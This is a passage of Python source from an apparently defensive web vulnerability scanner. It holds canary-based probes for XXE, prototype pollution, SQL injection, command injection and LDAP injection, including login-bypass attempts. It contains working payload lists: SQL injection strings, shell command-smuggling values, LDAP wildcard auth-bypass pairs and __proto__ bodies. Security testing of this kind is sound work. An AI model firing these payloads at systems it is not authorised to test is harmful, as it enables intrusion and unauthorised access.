    for ep, is_soap in candidates:
        if ep not in seen:
            seen[ep] = is_soap
            result.append((ep, is_soap))
        elif is_soap:
            seen[ep] = True
    return [(ep, seen[ep]) for ep in seen]


def check_xxe_injection(page_url: str, html_content: str, response_headers: dict) -> None:
    """
    Probe XML-accepting endpoints discovered on the current page for XXE.

    For each endpoint:
      - Send the safe static-entity payload as text/xml (POST)
      - For SOAP endpoints additionally send a SOAP-wrapped payload
      - If the canary string appears in the response body → HIGH
      - WSDL / service-definition exposure without auth → MEDIUM

    Only runs when --active-probes is enabled. Deduplicates per endpoint URL.
    8-second timeout per probe.
    """
    if not is_in_scope(page_url):
        return

    endpoints = _collect_xxe_endpoints(page_url, html_content, response_headers)
    if not endpoints:
        return

    domain = urlparse(page_url).netloc

    for endpoint_url, is_soap in endpoints:
        if endpoint_url in _xxe_tested:
            continue
        _xxe_tested.add(endpoint_url)

        # ── WSDL / service definition exposure check ──────────────────────
        # A WSDL exposes the full service contract (method names, param types,
        # namespaces) — useful to an attacker even without XXE.
        parsed_ep = urlparse(endpoint_url)
        wsdl_url  = endpoint_url.rstrip("?") + "?wsdl"
        if "wsdl" not in parsed_ep.query.lower() and "wsdl" not in parsed_ep.path.lower():
            try:
                stealth_delay(domain)
                wsdl_resp = _get_session().get(
                    wsdl_url,
                    headers=create_request_header(),
                    timeout=8,
                    verify=False,
                    allow_redirects=True,
                )
                wsdl_ct = wsdl_resp.headers.get("Content-Type", "").lower()
                if wsdl_resp.status_code == 200 and (
                    "xml" in wsdl_ct
                    or "<wsdl:" in wsdl_resp.text.lower()
                    or "<definitions" in wsdl_resp.text.lower()
                ):
                    alert(
                        "WSDL SERVICE DEFINITION EXPOSED",
                        "MEDIUM",
                        wsdl_url,
                        f"WSDL document accessible without authentication at {wsdl_url} — "
                        f"exposes full service contract including method names, parameter "
                        f"types, and namespace structure, aiding targeted XXE / SSRF attacks"
                    )
                    print(timestamp() + f" [!] WSDL exposed: {wsdl_url}")
            except Exception:
                pass

        # ── XXE entity reflection probes ──────────────────────────────────
        payloads = [("text/xml", _XXE_PAYLOAD)]
        if is_soap:
            payloads.append(("application/soap+xml", _XXE_SOAP_PAYLOAD))

        for content_type, payload in payloads:
            probe_key = (endpoint_url, content_type)
            if probe_key in _xxe_tested:
                continue
            _xxe_tested.add(probe_key)

            try:
                stealth_delay(domain)
                hdrs = create_request_header()
                hdrs["Content-Type"] = content_type
                resp = _get_session().post(
                    endpoint_url,
                    data=payload.encode("utf-8"),
                    headers=hdrs,
                    timeout=8,
                    verify=False,
                    allow_redirects=True,
                )
                if _XXE_CANARY in resp.text:
                    label = "SOAP XXE" if "soap" in content_type else "XXE"
                    alert(
                        f"{label} INJECTION CONFIRMED",
                        "HIGH",
                        endpoint_url,
                        f"XML entity expansion is enabled at {endpoint_url} — "
                        f"the canary value '{_XXE_CANARY}' was reflected in the "
                        f"response body, confirming the XML parser resolves "
                        f"DOCTYPE entity declarations. An attacker can leverage "
                        f"this to read local files, probe internal services (SSRF), "
                        f"or cause denial of service via entity expansion."
                    )
                    print(timestamp() + f" [!!] XXE confirmed ({content_type}): {endpoint_url}")
            except requests.exceptions.Timeout:
                pass
            except Exception as e:
                print_error(f"XXE probe failed for {endpoint_url}: {e}")


# ─────────────────────────────────────────────
# Prototype pollution detection
# ─────────────────────────────────────────────

_PP_CANARY = "pp-test"

# JSON body payloads — one per probe slot; sent alongside any existing fields
_PP_BODY_PAYLOADS = [
    {"__proto__":              {"nuscrape": "pp-test"}},
    {"constructor":            {"prototype": {"nuscrape": "pp-test"}}},
]

# URL query-string payloads — appended to existing params
_PP_QUERY_PAYLOADS = [
    "__proto__[nuscrape]=pp-test",
    "constructor[prototype][nuscrape]=pp-test",
]

# Client-side sink patterns searched in first-party JS bundles.
# Each tuple: (compiled regex, description shown in alert detail)
_PP_JS_SINKS = [
    (re.compile(r'\bObject\.assign\s*\(',        re.I), "Object.assign("),
    (re.compile(r'\$\.extend\s*\(',              re.I), "$.extend("),
    (re.compile(r'\b_\.merge\s*\(',              re.I), "_.merge("),
    (re.compile(r'\b_\.defaultsDeep\s*\(',       re.I), "_.defaultsDeep("),
    # JSON.parse result assigned via bracket notation
    (re.compile(r'JSON\.parse\s*\(.*?\)\s*\[',  re.I | re.DOTALL), "JSON.parse(…)["),
]

# Rough heuristic — nearby user-input sources tighten the signal
_PP_USER_INPUT_RE = re.compile(
    r'\b(?:req(?:uest)?\.(?:body|query|params)|'
    r'location\.(?:search|hash)|'
    r'URLSearchParams|'
    r'getParameter|'
    r'document\.(?:URL|referrer)|'
    r'window\.location)\b',
    re.I
)

_JS_CDN_RE = re.compile(
    r'cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net|'
    r'node_modules/|/vendor/|/bower_components/',
    re.IGNORECASE
)

# Dedup sets
_pp_body_tested:  set = set()   # endpoint URLs tested with body payloads
_pp_query_tested: set = set()   # endpoint URLs tested with query payloads
_pp_js_tested:    set = set()   # JS URLs already scanned for client-side sinks


def _pp_baseline(endpoint_url: str, method: str, base_json: dict) -> tuple:
    """
    Fire one baseline request so we can compare status codes.
    Returns (status_code, body) or (None, None) on failure.
    """
    try:
        hdrs = {**create_request_header(), "Content-Type": "application/json"}
        r = _get_session().request(
            method, endpoint_url,
            json=base_json,
            headers=hdrs,
            timeout=8,
            allow_redirects=False,
            verify=False,
        )
        return r.status_code, r.text
    except Exception:
        return None, None


def check_prototype_pollution(page_url: str, html_content: str) -> None:
    """
    Server-side prototype pollution (body + URL param probes) and
    client-side sink detection in first-party JS.

    Only called when --active-probes is enabled.
    Sends at most 3 pollution probes per endpoint to minimise instability risk.
    8-second timeout per probe.
    """
    if not is_in_scope(page_url):
        return

    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # ── Collect JSON-accepting POST/PUT endpoints ────────────────────────────
    # Source 1: HTML forms with POST/PUT that have no enctype or use JSON
    endpoints = []
    for form in soup.find_all("form"):
        method = form.get("method", "get").upper()
        if method not in ("POST", "PUT"):
            continue
        action = form.get("action") or page_url
        ep = urljoin(page_url, action)
        if urlparse(ep).netloc != domain:
            continue
        # Collect existing fields as the baseline body
        fields = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            n = inp.get("name", "")
            v = inp.get("value") or "test"
            if n and inp.get("type", "").lower() not in ("submit", "button", "image", "reset", "file"):
                fields[n] = v
        endpoints.append((ep, method, fields))

    # Source 2: API-looking page URL
    parsed_page = urlparse(page_url)
    if any(seg in parsed_page.path for seg in ("/api/", "/v1/", "/v2/", "/v3/", "/rest/", "/graphql")):
        endpoints.append((page_url, "POST", {}))

    # ── Server-side body probes ──────────────────────────────────────────────
    for endpoint_url, method, base_fields in endpoints:
        if endpoint_url in _pp_body_tested:
            continue
        _pp_body_tested.add(endpoint_url)

        baseline_status, _ = _pp_baseline(endpoint_url, method, base_fields)
        probes_sent = 0

        for payload_extra in _PP_BODY_PAYLOADS:
            if probes_sent >= 3:
                break
            probe_body = {**base_fields, **payload_extra}
            try:
                stealth_delay(domain)
                hdrs = {**create_request_header(), "Content-Type": "application/json"}
                resp = _get_session().request(
                    method, endpoint_url,
                    json=probe_body,
                    headers=hdrs,
                    timeout=8,
                    allow_redirects=False,
                    verify=False,
                )
                probes_sent += 1
                body = resp.text

                if _PP_CANARY in body:
                    alert(
                        "SERVER-SIDE PROTOTYPE POLLUTION",
                        "HIGH",
                        endpoint_url,
                        f"Canary value '{_PP_CANARY}' reflected in response after "
                        f"injecting prototype pollution payload {list(payload_extra.keys())[0]!r} "
                        f"into {method} {endpoint_url} — server-side prototype chain "
                        f"manipulation is confirmed; object properties injected via "
                        f"__proto__ or constructor.prototype are resolved at runtime"
                    )
                    print(timestamp() + f" [!!] Server-side prototype pollution (body): {endpoint_url}")
                    break  # one confirmed finding per endpoint is sufficient

                elif resp.status_code == 500 and baseline_status is not None and baseline_status != 500:
                    alert(
                        "PROTOTYPE POLLUTION — POSSIBLE SERVER CRASH",
                        "MEDIUM",
                        endpoint_url,
                        f"Server returned 500 (baseline: {baseline_status}) after "
                        f"injecting prototype pollution payload {list(payload_extra.keys())[0]!r} "
                        f"into {method} {endpoint_url} — the injection may have corrupted "
                        f"a shared prototype, causing a runtime exception; manual "
                        f"verification required"
                    )
                    print(timestamp() + f" [!] Prototype pollution possible crash: {endpoint_url}")

            except requests.exceptions.Timeout:
                probes_sent += 1
            except Exception as e:
                print_error(f"PP body probe failed for {endpoint_url}: {e}")
                probes_sent += 1

    # ── URL query-string probes ──────────────────────────────────────────────
    for endpoint_url, method, _ in endpoints:
        if endpoint_url in _pp_query_tested:
            continue
        _pp_query_tested.add(endpoint_url)

        parsed_ep = urlparse(endpoint_url)
        existing_qs = parsed_ep.query
        probes_sent  = 0

        for qs_suffix in _PP_QUERY_PAYLOADS:
            if probes_sent >= 3:
                break
            sep      = "&" if existing_qs else "?"
            test_url = endpoint_url.split("?")[0] + (
                "?" + existing_qs + "&" + qs_suffix if existing_qs else "?" + qs_suffix
            )
            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=8,
                    allow_redirects=False,
                    verify=False,
                )
                probes_sent += 1
                if _PP_CANARY in resp.text:
                    alert(
                        "PROTOTYPE POLLUTION VIA URL PARAMETER",
                        "HIGH",
                        test_url,
                        f"Canary value '{_PP_CANARY}' reflected in response after "
                        f"injecting '{qs_suffix}' as a query parameter — the server "
                        f"parses bracket-notation query keys and merges them into "
                        f"a shared object, enabling prototype chain manipulation"
                    )
                    print(timestamp() + f" [!!] Prototype pollution (query): {test_url}")
                    break

            except requests.exceptions.Timeout:
                probes_sent += 1
            except Exception as e:
                print_error(f"PP query probe failed for {test_url}: {e}")
                probes_sent += 1


def scan_js_for_prototype_pollution_sinks(page_url: str, js_url: str, js_text: str) -> None:
    """
    Scan a first-party JS bundle for known prototype pollution sinks combined
    with nearby user-input sources. Called from analyse_js_bundle when
    --active-probes is enabled; the JS content is already downloaded.

    Flags MEDIUM — a sink alone is not exploitable; the analyst must verify
    that user-controlled data reaches it without sanitisation.
    """
    if js_url in _pp_js_tested:
        return
    if _JS_CDN_RE.search(js_url):
        return  # skip vendor / CDN bundles
    _pp_js_tested.add(js_url)

    for sink_re, sink_label in _PP_JS_SINKS:
        for m in sink_re.finditer(js_text):
            start = max(0, m.start() - 300)
            end   = min(len(js_text), m.end() + 300)
            window = js_text[start:end]
            if _PP_USER_INPUT_RE.search(window):
                ctx = re.sub(r'\s+', ' ', window).strip()[:300]
                alert(
                    "CLIENT-SIDE PROTOTYPE POLLUTION SINK",
                    "MEDIUM",
                    js_url,
                    f"Sink '{sink_label}' found in first-party JS with a "
                    f"user-controlled input source nearby — manual verification "
                    f"required to confirm exploitability. Context: {ctx!r}"
                )
                print(timestamp() + f" [!] PP client-side sink '{sink_label}': {js_url}")
                # Report at most one finding per sink label per JS file
                break


# ─────────────────────────────────────────────
# SQL Injection detection
# ─────────────────────────────────────────────

# Error-based detection strings — presence in response body confirms injection
_SQLI_ERROR_STRINGS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "Microsoft OLE DB",
    "ODBC SQL Server",
    "PostgreSQL ERROR",
    "Warning: pg_",
    "SQLite3::",
    "syntax error",
    "unclosed quotation",
    "quoted string not properly terminated",
]

# Error-based payloads (appended to each parameter value)
_SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "')",
    "'))",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    ";--",
]

# Time-based (blind) payloads — flag HIGH if response time > 5 s
_SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]
_SQLI_TIME_THRESHOLD = 5.0   # seconds

# Static file extensions whose query params are not injection targets
_SQLI_STATIC_RE = re.compile(
    r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map|mp4|mp3|pdf|zip|gz|tar)(\?|$)',
    re.IGNORECASE,
)

_sqli_tested: set  = set()   # (base_url, param) pairs already probed
_sqli_domains: set = set()   # domains where SQLi was confirmed (stop testing)


def check_sqli(page_url: str, html_content) -> None:
    """
    Error-based and time-based SQL injection detection.

    Collects URL parameters from page links and GET-form action URLs, then
    appends each payload to each parameter value.  Stops after the first
    confirmed finding per domain (dedup + avoid hammering the server).

    Only called when --active-probes is enabled.
    Safe-mode only — no data extraction, schema dumping, or destructive payloads.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Build candidate list: current page URL + linked hrefs + form actions
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    # Note WAF presence in findings if detected for this domain
    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block, not a real injection]"

    for raw_url in all_urls:
        if domain in _sqli_domains:
            break
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            # Skip static asset URLs
            if _SQLI_STATIC_RE.search(parsed.path):
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param, orig_val in params.items():
            if domain in _sqli_domains:
                break
            test_key = (base, param)
            if test_key in _sqli_tested:
                continue
            _sqli_tested.add(test_key)

            print(timestamp() + f" SQLi probe: {base} param={param}")

            # ── Phase 1: error-based ─────────────────────────────────────────
            for payload in _SQLI_ERROR_PAYLOADS:
                if domain in _sqli_domains:
                    break
                new_query = "&".join(
                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                test_url = base + "?" + new_query
                try:
                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=10,
                        allow_redirects=True,
                    )
                    body = (resp.text or "")
                    for err_str in _SQLI_ERROR_STRINGS:
                        if err_str.lower() in body.lower():
                            snippet = body[max(0, body.lower().find(err_str.lower()) - 40):
                                          body.lower().find(err_str.lower()) + 120].strip()
                            alert(
                                "SQL INJECTION (ERROR-BASED)",
                                "CRITICAL",
                                domain,
                                f"Parameter '{param}' on {base} reflects SQL error '{err_str}' "
                                f"with payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
                            )
                            _sqli_domains.add(domain)
                            break
                except Exception:
                    pass
                if domain in _sqli_domains:
                    break

            if domain in _sqli_domains:
                break

            # ── Phase 2: time-based (blind) ──────────────────────────────────
            for payload in _SQLI_TIME_PAYLOADS:
                new_query = "&".join(
                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                test_url = base + "?" + new_query
                try:
                    stealth_delay(domain)
                    t0   = time.monotonic()
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=10,
                        allow_redirects=True,
                    )
                    elapsed = time.monotonic() - t0
                    if elapsed >= _SQLI_TIME_THRESHOLD:
                        alert(
                            "SQL INJECTION (TIME-BASED BLIND CANDIDATE)",
                            "HIGH",
                            domain,
                            f"Parameter '{param}' on {base} delayed {elapsed:.1f}s (>{_SQLI_TIME_THRESHOLD}s) "
                            f"with time-based payload: {payload!r} — manual verification required{waf_note}",
                        )
                        break
                except Exception:
                    pass


# ─────────────────────────────────────────────
# Command Injection detection
# ─────────────────────────────────────────────

_CMDI_CANARY = "nuscrape-ci-canary"

# Linux/Unix payloads
_CMDI_UNIX_PAYLOADS = [
    f";echo {_CMDI_CANARY}",
    f"|echo {_CMDI_CANARY}",
    f"`echo {_CMDI_CANARY}`",
    f"$(echo {_CMDI_CANARY})",
    f";echo${{IFS}}{_CMDI_CANARY}",
    f"%0aecho%20{_CMDI_CANARY}",
]

# Windows payloads + detection strings
_CMDI_WIN_PAYLOADS = [
    f"&echo {_CMDI_CANARY}",
    f"|echo {_CMDI_CANARY}",
    ";dir",
]
_CMDI_WIN_INDICATORS = [
    "Volume in drive",
    "Directory of",
    _CMDI_CANARY,
]

_cmdi_tested: set  = set()   # (base_url, param) already probed
_cmdi_domains: set = set()   # domains where CMDi was confirmed


def check_cmdi(page_url: str, html_content) -> None:
    """
    Canary-based OS command injection detection.

    Injects harmless echo commands into every URL parameter found on the page.
    Flags CRITICAL only when the literal canary string appears in the response —
    proving the shell executed our input.

    Only called when --active-probes is enabled.
    Safe-mode only — no destructive commands, no reverse shells, no file reads.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block]"

    for raw_url in all_urls:
        if domain in _cmdi_domains:
            break
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            if _SQLI_STATIC_RE.search(parsed.path):   # reuse same static-file filter
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param, orig_val in params.items():
            if domain in _cmdi_domains:
                break
            test_key = (base, param)
            if test_key in _cmdi_tested:
                continue
            _cmdi_tested.add(test_key)

            print(timestamp() + f" CMDi probe: {base} param={param}")

            all_payloads = _CMDI_UNIX_PAYLOADS + _CMDI_WIN_PAYLOADS

            for payload in all_payloads:
                if domain in _cmdi_domains:
                    break
                new_query = "&".join(
                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                test_url = base + "?" + new_query
                try:
                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=10,
                        allow_redirects=True,
                    )
                    body = resp.text or ""
                    # Check for canary echo (Linux and Windows)
                    if _CMDI_CANARY in body:
                        idx = body.find(_CMDI_CANARY)
                        snippet = body[max(0, idx - 30):idx + len(_CMDI_CANARY) + 60].strip()
                        alert(
                            "COMMAND INJECTION (CONFIRMED)",
                            "CRITICAL",
                            domain,
                            f"Parameter '{param}' on {base} echoed canary string with "
                            f"payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
                        )
                        _cmdi_domains.add(domain)
                        break
                    # Windows-specific indicators (no canary, but dir output seen)
                    if payload in _CMDI_WIN_PAYLOADS:
                        for win_str in _CMDI_WIN_INDICATORS:
                            if win_str in body and win_str != _CMDI_CANARY:
                                snippet = body[max(0, body.find(win_str) - 30):
                                               body.find(win_str) + 120].strip()
                                alert(
                                    "COMMAND INJECTION (WINDOWS INDICATOR)",
                                    "CRITICAL",
                                    domain,
                                    f"Parameter '{param}' on {base} returned Windows shell output "
                                    f"'{win_str}' with payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
                                )
                                _cmdi_domains.add(domain)
                                break
                except Exception:
                    pass


# ─────────────────────────────────────────────
# LDAP Injection detection
# ─────────────────────────────────────────────

# Error strings that confirm server-side LDAP processing
_LDAP_ERROR_STRINGS = [
    "LDAP error",
    "LDAPException",
    "javax.naming",
    "com.sun.jndi",
    "Invalid DN",
    "supplied argument is not a valid ldap",
    "Bad search filter",
    "ldap_search",
    "LdapErr",
    "DSA is unwilling to perform",
    "No Such Object",
]

# Metacharacter payloads that trigger LDAP errors on unparameterised queries
_LDAP_ERROR_PAYLOADS = [
    "*",
    ")(uid=*",
    "*(uid=*)",
    "*(|(uid=*))",
    "*)(objectClass=*",
    ")(objectClass=*",
    "*(objectClass=*)",
    "\\2a",
    "\\28",
    "\\29",
]

# Classic LDAP auth bypass pairs (username_payload, password_payload)
_LDAP_BYPASS_PAIRS = [
    ("*",          "*"),
    ("admin)(&)",  "anything"),
    ("*)(&",       "anything"),
    ("*)(uid=*",   "anything"),
]

# Body phrases consistent with a successful login
_LDAP_SUCCESS_BODY = frozenset({
    "welcome", "logged in", "log out", "logout", "sign out", "signout",
    "dashboard", "my account", "your account", "profile", "portal",
    "you are now logged", "successfully authenticated",
})

# URL path segments that suggest a post-login landing page
_LDAP_SUCCESS_PATHS = frozenset({
    "dashboard", "admin", "home", "welcome", "profile", "account",
    "portal", "main", "index", "overview", "panel",
})

# Input name/id values that identify a username field
_LDAP_USER_NAMES = frozenset({
    "user", "username", "login", "email", "mail", "uid", "name",
    "account", "userid", "user_name", "user_email",
    "loginname", "login_name", "uname",
})

# Input name/id values that identify a password field
_LDAP_PASS_NAMES = frozenset({
    "pass", "password", "passwd", "pwd", "secret",
    "pass1", "password1", "userpass", "user_pass",
})

_ldapi_tested: set      = set()   # (base_url, param) URL-param pairs already probed
_ldapi_form_tested: set = set()   # form action URLs already tested for auth bypass


def _is_login_form(form) -> bool:
    """Return True if the BeautifulSoup <form> element looks like an auth form."""
    inputs     = form.find_all("input")
    has_pass   = any(i.get("type", "").lower() == "password" for i in inputs)
    has_user   = any(
        i.get("name", "").lower() in _LDAP_USER_NAMES
        or i.get("id",   "").lower() in _LDAP_USER_NAMES
        for i in inputs
    )
    return has_pass and has_user


def _ldap_login_success(resp, baseline_cookies: dict) -> bool:
    """
    Return True if *resp* looks like a successful login.

    Three independent signals (any one is sufficient):
      1. Final URL path contains a known post-login segment.
      2. A new auth-related cookie appeared that was not in the baseline.
      3. Response body contains a success phrase.
    """
    if resp is None:
        return False

    # Signal 1 — redirect to a success path
    final_path = urlparse(resp.url).path.lower()
    if any(seg in final_path for seg in _LDAP_SUCCESS_PATHS):
        return True

    # Signal 2 — new cookie with an auth-related name
    new_cookies = set(resp.cookies) - set(baseline_cookies)
    if new_cookies:
        _AUTH_COOKIE_NAMES = {"session", "token", "auth", "jwt", "access", "user", "uid"}
        if any(any(n in c.lower() for n in _AUTH_COOKIE_NAMES) for c in new_cookies):
            return True

    # Signal 3 — success phrase in body
    body_lower = (resp.text or "").lower()
    if any(phrase in body_lower for phrase in _LDAP_SUCCESS_BODY):
        return True

    return False


def check_ldap_injection(page_url: str, html_content) -> None:
    """
    LDAP injection and authentication bypass detection.

    Phase 1 — error-based parameter injection:
      Appends LDAP metacharacter payloads to every URL query parameter
      found on the page (links + form actions). Flags CRITICAL when a
      known LDAP error string is reflected in the response.

    Phase 2 — login form authentication bypass:
      Identifies POST forms that contain both a user and password field.
      Sends a baseline request with garbage credentials, then retries with
      classic LDAP wildcard bypass payloads. Flags HIGH when the bypass
      response contains a success signal that the baseline did not.

    Only called when --active-probes is enabled.
    Safe-mode only: no directory enumeration, no credential extraction,
    no directory modifications.
    8-second timeout per probe. Deduplicates per (base_url, param)
    and per form action URL.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block, not real injection]"

    # ── Phase 1: URL parameter error-based injection ──────────────────────────
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    for raw_url in all_urls:
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            if _SQLI_STATIC_RE.search(parsed.path):   # reuse static-file filter
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param, orig_val in params.items():
            test_key = (base, param)
            if test_key in _ldapi_tested:
                continue
            _ldapi_tested.add(test_key)

            print(timestamp() + f" LDAPi probe: {base} param={param}")

            for payload in _LDAP_ERROR_PAYLOADS:
                new_query = "&".join(
                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                test_url = base + "?" + new_query
                try:
                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=8,
                        allow_redirects=True,
                    )
                    body = resp.text or ""
                    for err_str in _LDAP_ERROR_STRINGS:
                        if err_str.lower() in body.lower():
                            idx     = body.lower().find(err_str.lower())
                            snippet = body[max(0, idx - 40):idx + 120].strip()
                            alert(
                                "LDAP INJECTION (ERROR-BASED)",
                                "CRITICAL",
                                domain,
                                f"Parameter '{param}' on {base} reflects LDAP error "
                                f"'{err_str}' with payload: {payload!r} | "
                                f"Snippet: {snippet!r}{waf_note}",
                            )
                            break   # one alert per parameter is enough
                except Exception:
                    pass

    # ── Phase 2: Login form authentication bypass ─────────────────────────────
    for form in soup.find_all("form"):
        if not _is_login_form(form):
            continue
        if form.get("method", "get").upper() != "POST":
            continue

        action     = form.get("action") or page_url
        action_url = urljoin(page_url, action)
        if is_third_party_cdn(urlparse(action_url).netloc):
            continue
        if action_url in _ldapi_form_tested:
            continue
        _ldapi_form_tested.add(action_url)

        # Resolve username and password field names from the form DOM
        field_defaults: dict = {}
        user_field = pass_field = None
        for inp in form.find_all(["input", "select", "textarea"]):
            name = inp.get("name", "")
            if not name:
                continue
            field_defaults[name] = inp.get("value", "")
            itype = inp.get("type", "").lower()
            if itype == "password":
                pass_field = name
            elif (name.lower() in _LDAP_USER_NAMES
                  or inp.get("id", "").lower() in _LDAP_USER_NAMES):
                user_field = name

        if not user_field or not pass_field:
            continue   # cannot identify credential fields; skip

        print(timestamp() + f" LDAP auth bypass probe: {action_url}"
              + f" [{user_field}={pass_field}]")

        # Baseline with obviously invalid credentials
        baseline_data = {
            **field_defaults,
            user_field: "nuscrape_ldap_baseline_user",
            pass_field: "nuscrape_ldap_baseline_pass",
        }
        try:
            stealth_delay(domain)
            baseline_resp    = _get_session().post(
                action_url,
                data=baseline_data,
                headers=create_request_header(),
                timeout=8,
                allow_redirects=True,
            )
            baseline_cookies = dict(baseline_resp.cookies)
        except Exception:
            continue   # cannot establish baseline; skip this form

        # Try each bypass payload pair
        for user_payload, pass_payload in _LDAP_BYPASS_PAIRS:
            bypass_data = {
                **field_defaults,
                user_field: user_payload,
                pass_field: pass_payload,
            }
            try:
                stealth_delay(domain)
                bypass_resp = _get_session().post(
                    action_url,
                    data=bypass_data,
                    headers=create_request_header(),
                    timeout=8,
                    allow_redirects=True,
                )
                if _ldap_login_success(bypass_resp, baseline_cookies):
                    body_snip = (bypass_resp.text or "")[:300].strip()
                    alert(
                        "LDAP AUTHENTICATION BYPASS",
                        "HIGH",
                        domain,
                        f"Login form at {action_url} accepted LDAP wildcard bypass — "
                        f"{user_field}={user_payload!r}, {pass_field}={pass_payload!r} | "
                        f"Final URL: {bypass_resp.url} | "
                        f"Snippet: {body_snip!r}{waf_note}",
                    )
                    break   # one alert per form
            except Exception:
                pass


# ─────────────────────────────────────────────
# Insecure Deserialization Detection
# ─────────────────────────────────────────────

# ── Passive indicator constants ─────────────────────────────────────────────

_JAVA_SERIAL_MAGIC      = b"\xac\xed\x00\x05"
_JAVA_SERIAL_B64_PREFIX = "rO0AB"          # base64 encoding of AC ED 00 05

# PHP serialized object/array/string/bool/int/null prefix patterns
_PHP_SERIAL_RE = re.compile(
    r"(?:^|[\s\n;{,])(?:O:\d+:\"|a:\d+:\{|s:\d+:\"|b:[01];|i:\d+;|N;)",
    re.MULTILINE,
)

# Python pickle protocol 2–5 magic bytes
_PICKLE_MAGICS = (b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05")

_RUBY_MARSHAL_MAGIC = b"\x04\x08"

# Matches both attribute-order variants of a __VIEWSTATE hidden input
_VIEWSTATE_RE = re.compile(
    r'<input[^>]+name=["\']__VIEWSTATE["\'][^>]*value=["\']([^"\']{4,})["\']'
    r'|<input[^>]+value=["\']([^"\']{4,})["\'][^>]*name=["\']__VIEWSTATE["\']',
    re.IGNORECASE | re.DOTALL,
)
_VIEWSTATE_B64_RE = re.compile(r'^[A-Za-z0-9+/=]+$')

# ── Active probe error strings ──────────────────────────────────────────────

_JAVA_DESERIAL_ERRORS = [
    "java.io.InvalidClassException",
    "java.lang.ClassNotFoundException",
    "ObjectInputStream",
    "ClassCastException",
    "java.io.StreamCorruptedException",
]
_PHP_DESERIAL_ERRORS = [
    "unserialize(): Error",
    "Cannot unserialize",
    "__wakeup",
    "__destruct",
    "unserialize() expects parameter",
]

# ── Dedup sets ──────────────────────────────────────────────────────────────

_deserial_passive_seen: set  = set()   # (page_url, format_label)
_deserial_active_tested: set = set()   # (endpoint, format_label)


# ── Helpers ─────────────────────────────────────────────────────────────────

def _to_bytes(content) -> bytes:
    """Return content as bytes regardless of input type."""
    if isinstance(content, bytes):
        return content
    if isinstance(content, str):
        return content.encode("utf-8", errors="replace")
    return b""


def scan_deserial_passive(
    page_url: str,
    html_content,
    response_headers: dict,
